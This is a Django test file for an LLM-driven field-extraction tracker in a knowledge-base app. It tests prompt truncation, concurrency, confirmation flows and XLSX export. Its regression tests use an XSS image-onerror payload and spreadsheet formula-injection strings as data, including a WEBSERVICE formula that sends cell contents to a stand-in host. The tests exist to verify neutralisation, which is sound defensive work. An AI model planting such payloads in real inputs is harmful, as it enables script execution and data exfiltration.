"""追踪表：AI 自动抽取登记（服务层 mock LLM + 视图 + CSV + pipeline 钩子）。"""
from unittest.mock import patch

from django.contrib.auth import get_user_model
from django.test import TestCase
from django.urls import reverse

from kb.models import Document, KbTracker, KnowledgeBase, TrackerRow
from kb.tracker import (build_extraction_prompt, parse_llm_json, run_extraction)


def _fake_llm(payload: str):
    """返回可 patch kb.tracker._llm_invoke 的假 LLM（输出固定 JSON 文本）。"""
    return lambda prompt: payload


class TrackerServiceTests(TestCase):
    def setUp(self):
        self.user = get_user_model().objects.create_user(
            username="trk-admin", password="pw", is_staff=True)
        self.kb = KnowledgeBase.objects.create(
            name="定检库", slug="trk-lib", created_by=self.user)

    def test_prompt_contains_fields_rules_and_truncation(self):
        fields = [{"label": "设备编号"}, {"label": "检验日期"}]
        # 上限内（18k < 24k）应全文直送，不再截断
        md = "正文" * 9000
        p = build_extraction_prompt("定检库", fields, md, instruction="结论只填合格/不合格")
        self.assertIn("设备编号", p)
        self.assertIn("严禁编造", p)
        self.assertIn("结论只填合格/不合格", p)
        self.assertIn("YYYY-MM-DD", p)
        self.assertNotIn("已省略", p)
        self.assertLessEqual(len(p), 24000 + 800)  # 全文 + 提示词开销

    def test_prompt_over_limit_keeps_head_and_tail(self):
        """超长文档头尾保留：文末签名表（检验员等落款）不能被截掉。"""
        fields = [{"label": "检验员姓名"}]
        md = ("头部标记" + "正" * 30000
              + "中部标记" + "文" * 30000
              + "\n姓名/NAME: Tang sheng dong")  # 共约 6 万字符 > 24000 上限
        p = build_extraction_prompt("定检库", fields, md)
        self.assertIn("已省略", p)                 # 确实超长截断了
        self.assertIn("头部标记", p)                # 头部保留
        self.assertNotIn("中部标记", p)             # 中部被省略
        self.assertIn("Tang sheng dong", p)        # 尾部签名表保留
        self.assertLessEqual(len(p), 24000 + 900)

    def test_parse_llm_json_variants(self):
        self.assertEqual(parse_llm_json('{"a": "1"}'), {"a": "1"})
        self.assertEqual(parse_llm_json('```json\n{"a": "1"}\n```'), {"a": "1"})
        self.assertEqual(parse_llm_json('前置说明 {"a": "1"} 后缀'), {"a": "1"})
        with self.assertRaises(ValueError):
            parse_llm_json("完全没有 JSON")

    def test_run_extraction_happy_path(self):
        tr = KbTracker.objects.create(
            kb=self.kb, enabled=True,
            fields=[{"label": "设备编号"}, {"label": "结论"}])
        doc = Document.objects.create(
            kb=self.kb, original_name="定检报告7月.pdf", file_type="pdf",
            status="completed", md_content="# 报告\n设备 SDLSPDRTP0003 合格")
        with patch("kb.tracker._llm_invoke",
                   _fake_llm('{"设备编号": "SDLSPDRTP0003", "结论": "合格", "多余": "x"}')):
            ok = run_extraction(doc.id)
        self.assertTrue(ok)
        row = TrackerRow.objects.get(tracker=tr, document=doc)
        self.assertEqual(row.status, "done")
        self.assertEqual(row.values, {"设备编号": "SDLSPDRTP0003", "结论": "合格"})

    def test_run_extraction_llm_failure_marks_row(self):
        tr = KbTracker.objects.create(
            kb=self.kb, enabled=True, fields=[{"label": "结论"}])
        doc = Document.objects.create(
            kb=self.kb, original_name="报告.pdf", file_type="pdf",
            status="completed", md_content="内容")
        with patch("kb.tracker._llm_invoke", side_effect=RuntimeError("LLM 连接失败")):
            ok = run_extraction(doc.id)
        self.assertFalse(ok)
        row = TrackerRow.objects.get(tracker=tr, document=doc)
        self.assertEqual(row.status, "failed")
        self.assertIn("LLM", row.error)

    def test_run_extraction_skips_disabled_or_untracked(self):
        doc = Document.objects.create(
            kb=self.kb, original_name="无表.pdf", file_type="pdf",
            status="completed", md_content="内容")
        self.assertFalse(run_extraction(doc.id))  # 无 tracker
        KbTracker.objects.create(kb=self.kb, enabled=False, fields=[{"label": "x"}])
        self.assertFalse(run_extraction(doc.id))  # 未启用
        self.assertEqual(TrackerRow.objects.count(), 0)

    def test_running_row_not_reclaimed(self):
        """running 中的行不能被二次认领（防钩子与补录并发双跑）。"""
        tr = KbTracker.objects.create(
            kb=self.kb, enabled=True, fields=[{"label": "结论"}])
        doc = Document.objects.create(
            kb=self.kb, original_name="并发.pdf", file_type="pdf",
            status="completed", md_content="内容")
        TrackerRow.objects.create(tracker=tr, document=doc, status="running")
        with patch("kb.tracker._llm_invoke") as m:  # 只断言不被调用
            self.assertFalse(run_extraction(doc.id))
            m.assert_not_called()

    def test_folder_tracker_covers_child_docs(self):
        """追踪表建在文件夹上：子库文档的自动钩子要能找到它。"""
        folder = KnowledgeBase.objects.create(
            name="定检文件夹", slug="trk-folder", is_folder=True, created_by=self.user)
        child = KnowledgeBase.objects.create(
            name="子库", slug="trk-child", parent=folder, created_by=self.user)
        KbTracker.objects.create(
            kb=folder, enabled=True, fields=[{"label": "结论"}])
        doc = Document.objects.create(
            kb=child, original_name="子库文档.pdf", file_type="pdf",
            status="completed", md_content="内容")
        with patch("kb.tracker._llm_invoke", _fake_llm('{"结论":"合格"}')):
            self.assertTrue(run_extraction(doc.id))
        self.assertEqual(TrackerRow.objects.filter(document=doc).count(), 1)


class TrackerViewTests(TestCase):
    def setUp(self):
        self.user = get_user_model().objects.create_user(
            username="trk-view", password="pw", is_staff=True)
        self.kb = KnowledgeBase.objects.create(
            name="视图库", slug="trk-view-lib", created_by=self.user)
        self.url = reverse("kb:tracker", args=["trk-view-lib"])

    def test_disabled_by_default_enable_then_edit(self):
        """默认关闭：页面只有说明+启用按钮；启用后才出现字段编辑等功能。"""
        self.client.force_login(self.user)
        r = self.client.get(self.url)
        self.assertEqual(r.status_code, 200)
        self.assertContains(r, "id=\"trkEnable\"")
        self.assertNotContains(r, "同构工作流")  # 说明文案已删
        self.assertNotContains(r, "fields_text")  # 配置表单不渲染
        self.assertNotContains(r, 'id="trkBackfill"')
        # 启用（AJAX）→ 配置出现并可保存
        r1 = self.client.post(self.url, {"action": "enable"},
                              HTTP_X_REQUESTED_WITH="XMLHttpRequest")
        self.assertTrue(r1.json()["ok"])
        self.assertTrue(KbTracker.objects.get(kb=self.kb).enabled)
        r2 = self.client.get(self.url)
        self.assertContains(r2, "追踪字段")
        self.assertContains(r2, "补录已有文档")
        r3 = self.client.post(self.url, {
            "action": "config_save",
            "fields_text": "设备编号\n检验日期\n\n设备编号",  # 空行跳过 + 去重
            "instruction": "结论只填 合格/不合格",
        }, HTTP_X_REQUESTED_WITH="XMLHttpRequest")
        self.assertTrue(r3.json()["ok"])
        tr = KbTracker.objects.get(kb=self.kb)  # 显式重查（跳过缓存的关系对象）
        self.assertTrue(tr.enabled)
        self.assertEqual([f["label"] for f in tr.fields], ["设备编号", "检验日期"])
        # 停用：配置隐藏、已启用状态文案消失
        self.client.post(self.url, {"action": "disable"},
                         HTTP_X_REQUESTED_WITH="XMLHttpRequest")
        r4 = self.client.get(self.url)
        self.assertFalse(KbTracker.objects.get(kb=self.kb).enabled)
        self.assertNotContains(r4, "fields_text")

    def test_permission_required(self):
        other = get_user_model().objects.create_user(username="trk-noob", password="pw")
        self.client.force_login(other)
        r = self.client.get(self.url)
        # 普通用户可管理自己的个人库，但无权查看这个共享库的管理页。
        self.assertEqual(r.status_code, 404)

    def test_xlsx_export_with_values(self):
        tr = KbTracker.objects.create(
            kb=self.kb, enabled=True, fields=[{"label": "设备编号"}, {"label": "结论"}])
        doc = Document.objects.create(
            kb=self.kb, original_name="报告A.pdf", file_type="pdf",
            status="completed", md_content="x")
        TrackerRow.objects.create(
            tracker=tr, document=doc, status="done",
            values={"设备编号": "P8-01", "结论": "合格"})
        self.client.force_login(self.user)
        r = self.client.get(self.url + "?xlsx=1")
        self.assertEqual(r.status_code, 200)
        self.assertIn("spreadsheetml", r["Content-Type"])
        self.assertIn(".xlsx", r["Content-Disposition"])
        self.assertEqual(r.content[:2], b"PK")  # xlsx = zip 包
        import io
        from openpyxl import load_workbook
        wb = load_workbook(io.BytesIO(r.content))
        data = [[c.value for c in row] for row in wb.active.iter_rows()]
        self.assertIn("设备编号", data[0])
        row = data[1]
        self.assertIn("报告A.pdf", row)
        self.assertIn("P8-01", row)
        self.assertIn("合格", row)

    def test_row_retry_and_delete(self):
        tr = KbTracker.objects.create(
            kb=self.kb, enabled=True, fields=[{"label": "结论"}])
        doc = Document.objects.create(
            kb=self.kb, original_name="重试.pdf", file_type="pdf",
            status="completed", md_content="x")
        row = TrackerRow.objects.create(
            tracker=tr, document=doc, status="failed", error="超时")
        self.client.force_login(self.user)
        with patch("kb.tracker.run_extraction_async") as m:
            r = self.client.post(self.url, {"action": "row_retry", "row_id": row.id},
                                 HTTP_X_REQUESTED_WITH="XMLHttpRequest")
            self.assertTrue(r.json()["ok"])
            m.assert_called_once()
        r2 = self.client.post(self.url, {"action": "row_delete", "row_id": row.id},
                              HTTP_X_REQUESTED_WITH="XMLHttpRequest")
        self.assertTrue(r2.json()["ok"])
        self.assertFalse(TrackerRow.objects.filter(id=row.id).exists())


class TrackerPipelineHookTests(TestCase):
    """文档入库 COMPLETED 后自动触发抽取（钩子存在且只在启用时调度）。"""

    def test_pipeline_calls_extraction_after_complete(self):
        user = get_user_model().objects.create_user(
            username="trk-pipe", password="pw", is_staff=True)
        kb = KnowledgeBase.objects.create(
            name="钩子库", slug="trk-hook", created_by=user)
        doc = Document.objects.create(
            kb=kb, original_name="钩子.txt", file="documents/hook.txt",
            file_type="txt", status="pending", md_content="")
        with patch("kb.pipeline.run_ocr_with_images", return_value=("内容", {}, None)), \
             patch("kb.pipeline.run_indexing", return_value=1), \
             patch("kb.tracker.run_extraction_async") as m:
            from kb.pipeline import process_document
            process_document(doc.id)
        doc.refresh_from_db()
        self.assertEqual(doc.status, "completed")
        m.assert_called_once_with(doc.id)


class TrackerConfirmFlowTests(TestCase):
    """重试保旧 + 人工确认（proposed/改前改后）+ 字段结构变更标记。"""

    def setUp(self):
        self.user = get_user_model().objects.create_user(
            username="trk-cf", password="pw", is_staff=True)
        self.kb = KnowledgeBase.objects.create(
            name="确认库", slug="trk-cf-lib", created_by=self.user)
        self.tr = KbTracker.objects.create(
            kb=self.kb, enabled=True, schema_version=0,
            fields=[{"label": "设备编号"}, {"label": "结论"}])
        self.doc = Document.objects.create(
            kb=self.kb, original_name="确认.pdf", file_type="pdf",
            status="completed", md_content="内容")

    def _row(self, **kw):
        return TrackerRow.objects.create(
            tracker=self.tr, document=self.doc, **kw)

    def test_prompt_carries_prior_values(self):
        p = build_extraction_prompt(
            "确认库", self.tr.fields, "正文", prior_values={"设备编号": "P8", "结论": ""})
        self.assertIn("此前已登记过", p)
        self.assertIn("P8", p)
        self.assertIn("沿用旧值", p)
        # 无旧值时不出现该块
        p2 = build_extraction_prompt("确认库", self.tr.fields, "正文")
        self.assertNotIn("此前已登记过", p2)

    def test_retry_identical_values_pass_through(self):
        """重抽结果与旧值完全一致 → 直接 done，不挂起。"""
        self._row(status="pending", schema_version=0,
                  values={"设备编号": "P8", "结论": "合格"})
        with patch("kb.tracker._llm_invoke",
                   _fake_llm('{"设备编号": "P8", "结论": "合格"}')):
            self.assertTrue(run_extraction(self.doc.id))
        row = TrackerRow.objects.get(document=self.doc)
        self.assertEqual(row.status, "done")
        self.assertEqual(row.proposed_values, {})
        self.assertEqual(row.schema_version, self.tr.schema_version)

    def test_retry_with_diff_goes_proposed(self):
        """重抽出现差异 → 挂起待确认：旧值保留、新值进 proposed_values。"""
        self._row(status="pending", schema_version=0,
                  values={"设备编号": "P8", "结论": "合格"})
        with patch("kb.tracker._llm_invoke",
                   _fake_llm('{"设备编号": "P8-错", "结论": "合格"}')):
            self.assertTrue(run_extraction(self.doc.id))
        row = TrackerRow.objects.get(document=self.doc)
        self.assertEqual(row.status, "proposed")
        self.assertEqual(row.values["设备编号"], "P8")          # 旧值不动
        self.assertEqual(row.proposed_values["设备编号"], "P8-错")
        self.assertEqual(row.values["结论"], "合格")

    def test_row_confirm_merges_choices(self):
        row = self._row(status="proposed", schema_version=0,
                        values={"设备编号": "P8", "结论": "合格"},
                        proposed_values={"设备编号": "P8-新", "结论": "不合格"})
        self.client.force_login(self.user)
        r = self.client.post(reverse("kb:tracker", args=["trk-cf-lib"]), {
            "action": "row_confirm", "row_id": row.id,
            "choices": '{"设备编号": "new", "结论": "old"}',
        }, HTTP_X_REQUESTED_WITH="XMLHttpRequest")
        self.assertTrue(r.json()["ok"])
        row.refresh_from_db()
        self.assertEqual(row.status, "done")
        self.assertEqual(row.values, {"设备编号": "P8-新", "结论": "合格"})  # 逐字段合并
        self.assertEqual(row.proposed_values, {})
        self.assertEqual(row.schema_version, self.tr.schema_version)

    def test_schema_change_marks_stale_rows(self):
        """配置字段变更 → 版本+1，老行 stale；确认/重抽后消除。"""
        row = self._row(status="done", schema_version=0,
                        values={"设备编号": "P8", "结论": "合格"})
        self.client.force_login(self.user)
        # 配置新增一个字段
        self.client.post(reverse("kb:tracker", args=["trk-cf-lib"]), {
            "action": "config_save",
            "fields_text": "设备编号\n结论\n下次检验日期", "instruction": "",
        }, HTTP_X_REQUESTED_WITH="XMLHttpRequest")
        self.tr.refresh_from_db()
        self.assertEqual(self.tr.schema_version, 1)
        row.refresh_from_db()
        self.assertLess(row.schema_version, self.tr.schema_version)  # stale
        # 页面渲染带标记与确认/重试入口
        page = self.client.get(reverse("kb:tracker", args=["trk-cf-lib"]))
        self.assertContains(page, "字段已变更")
        # 仅改 instruction 不动字段 → 版本不变
        self.client.post(reverse("kb:tracker", args=["trk-cf-lib"]), {
            "action": "config_save",
            "fields_text": "设备编号\n结论\n下次检验日期",
            "instruction": "新提示",
        }, HTTP_X_REQUESTED_WITH="XMLHttpRequest")
        self.tr.refresh_from_db()
        self.assertEqual(self.tr.schema_version, 1)

    def test_backfill_skips_proposed_rows(self):
        """待确认的行不被补录重复排队。"""
        self._row(status="proposed",
                  values={"设备编号": "P8"}, proposed_values={"设备编号": "P9"})
        from kb.tracker import backfill_async
        with patch("kb.tracker.run_extraction") as m:
            n = backfill_async(self.tr)
        self.assertEqual(n, 0)  # 唯一已完成文档已有待确认行 → 不排
        m.assert_not_called()


class KbEditDialogTrackerToggleTests(TestCase):
    """编辑知识库弹窗：tracker_enabled 勾选 ↔ 库的追踪表启停（kb_rename 可选字段）。"""

    def setUp(self):
        self.user = get_user_model().objects.create_user(
            username="trk-tgl", password="pw", is_staff=True)
        self.kb = KnowledgeBase.objects.create(
            name="开关库", slug="trk-tgl-lib", created_by=self.user)

    def test_toggle_via_kb_rename(self):
        url = reverse("kb:kb_rename", args=["trk-tgl-lib"])
        self.client.force_login(self.user)
        # 勾选 → 启用（tracker 不存在则创建）
        r = self.client.post(url, {"name": "开关库", "tracker_present": "1",
                                   "tracker_enabled": "on"},
                             HTTP_X_REQUESTED_WITH="XMLHttpRequest")
        self.assertTrue(r.json()["ok"])
        self.assertTrue(KbTracker.objects.get(kb=self.kb).enabled)
        # 取消勾选（checkbox 不发包，仅标记字段）→ 停用
        r2 = self.client.post(url, {"name": "开关库", "tracker_present": "1"},
                              HTTP_X_REQUESTED_WITH="XMLHttpRequest")
        self.assertTrue(r2.json()["ok"])
        self.assertFalse(KbTracker.objects.get(kb=self.kb).enabled)
        # 不带标记（列表页改名弹窗）→ 不动追踪表
        KbTracker.objects.filter(kb=self.kb).update(enabled=True)
        r3 = self.client.post(url, {"name": "开关库改名"},
                              HTTP_X_REQUESTED_WITH="XMLHttpRequest")
        self.assertTrue(r3.json()["ok"])
        self.assertTrue(KbTracker.objects.get(kb=self.kb).enabled)

    def test_dialog_has_toggle_and_short_label(self):
        self.client.force_login(self.user)
        r = self.client.get(reverse("kb:manage_detail", args=["trk-tgl-lib"]))
        self.assertContains(r, 'name="tracker_enabled"')
        self.assertContains(r, '描述（可选）</label>')
        self.assertNotContains(r, "给 AI 选库用的内容说明")
        # 未启用 → 顶部不显示「追踪表」入口；启用后显示
        self.assertNotContains(r, 'id="trkEntry"')
        KbTracker.objects.create(kb=self.kb, enabled=True, fields=[{"label": "x"}])
        r2 = self.client.get(reverse("kb:manage_detail", args=["trk-tgl-lib"]))
        self.assertContains(r2, 'id="trkEntry"')


class ReviewFixTests(TestCase):
    """代码审查修复回归：并发竞态 / XSS sanitize / 公式注入 / 回收 / 守卫。"""

    def setUp(self):
        self.user = get_user_model().objects.create_user(
            username="fix-admin", password="pw", is_staff=True)
        self.kb = KnowledgeBase.objects.create(
            name="修复库", slug="fix-lib", created_by=self.user)
        self.tr = KbTracker.objects.create(
            kb=self.kb, enabled=True, fields=[{"label": "结论"}])
        self.doc = Document.objects.create(
            kb=self.kb, original_name="修复.pdf", file="documents/x.pdf",
            file_type="pdf", status="completed", md_content="内容")
        self.url = reverse("kb:tracker", args=["fix-lib"])

    def _row(self, **kw):
        return TrackerRow.objects.create(tracker=self.tr, document=self.doc, **kw)

    def test_retry_rejected_while_running(self):
        row = self._row(status="running")
        self.client.force_login(self.user)
        with patch("kb.tracker.run_extraction_async") as m:
            r = self.client.post(self.url, {"action": "row_retry", "row_id": row.id},
                                 HTTP_X_REQUESTED_WITH="XMLHttpRequest")
        data = r.json()
        self.assertFalse(data["ok"])
        self.assertIn("抽取中", data["message"])
        m.assert_not_called()
        row.refresh_from_db()
        self.assertEqual(row.status, "running")  # 未被重置

    def test_terminal_write_loses_to_concurrent_winner(self):
        """LLM 调用期间行被他人写终态 → 本次写入放弃（CAS）。"""
        row = self._row(status="pending")  # 认领即置 running；竞态发生在 LLM 调用期间

        def racing_llm(prompt):
            # 模拟并发赢家：LLM 慢调用期间把行写成 done
            TrackerRow.objects.filter(id=row.id).update(
                status="done", values={"结论": "赢家"})
            return '{"结论": "输家"}'

        with patch("kb.tracker._llm_invoke", racing_llm):
            ok = run_extraction(self.doc.id, tracker_id=self.tr.id)
        self.assertFalse(ok)  # CAS 失败返回 False
        row.refresh_from_db()
        self.assertEqual(row.values, {"结论": "赢家"})  # 赢家结果未被覆盖

    def test_row_confirm_rejects_when_no_longer_proposed(self):
        row = self._row(status="proposed",
                        values={"结论": "旧"}, proposed_values={"结论": "新"})
        self.client.force_login(self.user)
        # 确认前行被重试改成 pending
        row.status = "pending"
        row.save(update_fields=["status"])
        r = self.client.post(self.url, {
            "action": "row_confirm", "row_id": row.id,
            "choices": '{"结论": "new"}',
        }, HTTP_X_REQUESTED_WITH="XMLHttpRequest")
        self.assertFalse(r.json()["ok"])
        row.refresh_from_db()
        self.assertEqual(row.values, {"结论": "旧"})  # 未被覆盖

    def test_field_labels_sanitized(self):
        self.client.force_login(self.user)
        r = self.client.post(self.url, {
            "action": "config_save",
            "fields_text": "<img src=x onerror=alert(1)>\n正常字段",
        }, HTTP_X_REQUESTED_WITH="XMLHttpRequest")
        self.assertTrue(r.json()["ok"])
        labels = [f["label"] for f in self.tr.refresh_from_db() or self.tr.fields]
        self.assertEqual(labels, ["img src=x onerror=alert(1)", "正常字段"])
        self.assertNotIn("<", "".join(labels))

    def test_xlsx_formula_injection_neutralized(self):
        row = self._row(status="done", values={"结论": '=WEBSERVICE("http://x/?"&A1)'})
        self.client.force_login(self.user)
        r = self.client.get(self.url + "?xlsx=1")
        import io
        from openpyxl import load_workbook
        wb = load_workbook(io.BytesIO(r.content))
        cell = wb.active.cell(row=2, column=2)
        self.assertEqual(cell.data_type, "s")  # 文本而非公式
        self.assertTrue(str(cell.value).startswith("'="))

    def test_backfill_guard_requires_enabled_and_fields(self):
        self.tr.enabled = False
        self.tr.save()
        self.client.force_login(self.user)
        r = self.client.post(self.url, {"action": "backfill"},
                             HTTP_X_REQUESTED_WITH="XMLHttpRequest")
        self.assertFalse(r.json()["ok"])

    def test_stale_running_row_reaped_on_page_view(self):
        from datetime import timedelta
        from django.utils import timezone
        row = self._row(status="running")
        TrackerRow.objects.filter(id=row.id).update(
            updated_at=timezone.now() - timedelta(minutes=30))
        self.client.force_login(self.user)
        self.client.get(self.url)
        row.refresh_from_db()
        self.assertEqual(row.status, "failed")
        self.assertIn("中断", row.error)

    def test_backfill_skips_docs_of_child_with_own_tracker(self):
        folder = KnowledgeBase.objects.create(
            name="文件夹", slug="fix-folder", is_folder=True, created_by=self.user)
        child = KnowledgeBase.objects.create(
            name="子库", slug="fix-child", parent=folder, created_by=self.user)
        KbTracker.objects.create(kb=child, enabled=True, fields=[{"label": "x"}])
        Document.objects.create(kb=child, original_name="子库文档.pdf",
                                file="documents/y.pdf", file_type="pdf",
                                status="completed", md_content="x")
        folder_tr = KbTracker.objects.create(
            kb=folder, enabled=True, fields=[{"label": "y"}])
        from kb.tracker import backfill_async
        with patch("kb.tracker.run_extraction") as m:
            n = backfill_async(folder_tr)
        self.assertEqual(n, 0)  # 子库自带 tracker → 不归文件夹表管
        m.assert_not_called()


class SecondRoundFixTests(TestCase):
    """复审修复：表头公式注入 + 认领刷新 updated_at（补录旧失败行不被回收误杀）。"""

    def setUp(self):
        self.user = get_user_model().objects.create_user(
            username="fix2-admin", password="pw", is_staff=True)
        self.kb = KnowledgeBase.objects.create(
            name="复审库", slug="fix2-lib", created_by=self.user)
        self.tr = KbTracker.objects.create(
            kb=self.kb, enabled=True, fields=[{"label": "=HYPERLINK(\"http://x\",\"险\")"}])
        self.doc = Document.objects.create(
            kb=self.kb, original_name="复审.pdf", file="documents/x.pdf",
            file_type="pdf", status="completed", md_content="内容")
        self.url = reverse("kb:tracker", args=["fix2-lib"])

    def test_header_formula_injection_neutralized(self):
        TrackerRow.objects.create(
            tracker=self.tr, document=self.doc, status="done",
            values={self.tr.fields[0]["label"]: "ok"})
        self.client.force_login(self.user)
        r = self.client.get(self.url + "?xlsx=1")
        import io
        from openpyxl import load_workbook
        wb = load_workbook(io.BytesIO(r.content))
        header = wb.active.cell(row=1, column=2)
        self.assertEqual(header.data_type, "s")  # 表头也是文本而非公式
        self.assertTrue(str(header.value).startswith("'="))

    def test_claim_refreshes_updated_at_so_reap_spares_backfill(self):
        """补录翻出的旧失败行：认领即刷新 updated_at，页面 GET 的 20 分钟
        回收不应误杀进行中的抽取（复审 P1 的实证回归）。"""
        from datetime import timedelta
        from django.utils import timezone
        row = TrackerRow.objects.create(
            tracker=self.tr, document=self.doc, status="failed", error="旧错")
        TrackerRow.objects.filter(id=row.id).update(
            updated_at=timezone.now() - timedelta(days=3))  # 三天前的失败行
        self.tr.fields = [{"label": "结论"}]
        self.tr.save()
        self.client.force_login(self.user)

        def llm_with_page_view(prompt):
            # LLM 慢调用期间有人打开了追踪表页（触发回收逻辑）
            self.client.get(self.url)
            return '{"结论": "合格"}'

        with patch("kb.tracker._llm_invoke", llm_with_page_view):
            ok = run_extraction(self.doc.id)
        self.assertTrue(ok)
        row.refresh_from_db()
        self.assertEqual(row.status, "done")     # 没被回收标成 failed
        self.assertEqual(row.values, {"结论": "合格"})


class ShadowingSemanticsTests(TestCase):
    """遮蔽语义：子库 tracker 仅「启用且已配置字段」时接管，停用不遮蔽。"""

    def setUp(self):
        self.user = get_user_model().objects.create_user(
            username="shadow-admin", password="pw", is_staff=True)
        self.folder = KnowledgeBase.objects.create(
            name="文件夹", slug="shadow-folder", is_folder=True, created_by=self.user)
        self.child = KnowledgeBase.objects.create(
            name="子库", slug="shadow-child", parent=self.folder, created_by=self.user)
        self.doc = Document.objects.create(
            kb=self.child, original_name="子库文档.pdf", file="documents/x.pdf",
            file_type="pdf", status="completed", md_content="内容")

    def _folder_tr(self):
        return KbTracker.objects.create(
            kb=self.folder, enabled=True, fields=[{"label": "结论"}])

    def test_disabled_child_tracker_does_not_shadow(self):
        """子库 tracker 停用 → 父文件夹表照常覆盖（钩子与补录一致）。"""
        KbTracker.objects.create(kb=self.child, enabled=False, fields=[{"label": "x"}])
        tr = self._folder_tr()
        # 自动钩子路径：解析到父表
        with patch("kb.tracker._llm_invoke", _fake_llm('{"结论": "合格"}')):
            self.assertTrue(run_extraction(self.doc.id))
        row = TrackerRow.objects.get(tracker=tr, document=self.doc)
        self.assertEqual(row.values, {"结论": "合格"})
        # 补录路径：翻出子库其它文档也不被停用的子表挡住
        from kb.tracker import backfill_async
        with patch("kb.tracker.run_extraction") as m:
            n = backfill_async(tr)
        self.assertEqual(n, 0)  # 该文档刚已登记 done → 无待补
        m.assert_not_called()

    def test_enabled_child_tracker_shadows_for_hook_and_backfill(self):
        """子表启用且有字段 → 钩子写进子表（父表不覆盖），父表补录也跳过。"""
        child_tr = KbTracker.objects.create(
            kb=self.child, enabled=True, fields=[{"label": "x"}])
        tr = self._folder_tr()
        with patch("kb.tracker._llm_invoke", _fake_llm('{"x": "子表值"}')):
            self.assertTrue(run_extraction(self.doc.id))
        # 行落在子表，父表没有该文档的行
        self.assertTrue(TrackerRow.objects.filter(
            tracker=child_tr, document=self.doc).exists())
        self.assertFalse(TrackerRow.objects.filter(
            tracker=tr, document=self.doc).exists())
        from kb.tracker import backfill_async
        with patch("kb.tracker.run_extraction") as m2:
            self.assertEqual(backfill_async(tr), 0)  # 父表补录不越权接管
            m2.assert_not_called()

    def test_enabled_but_fieldless_child_tracker_does_not_shadow(self):
        """启用但没配字段的子表同样不遮蔽（与钩子的 fields 校验一致）。"""
        KbTracker.objects.create(kb=self.child, enabled=True, fields=[])
        tr = self._folder_tr()
        with patch("kb.tracker._llm_invoke", _fake_llm('{"结论": "合格"}')):
            self.assertTrue(run_extraction(self.doc.id))
        self.assertEqual(TrackerRow.objects.get(tracker=tr).values,
                         {"结论": "合格"})
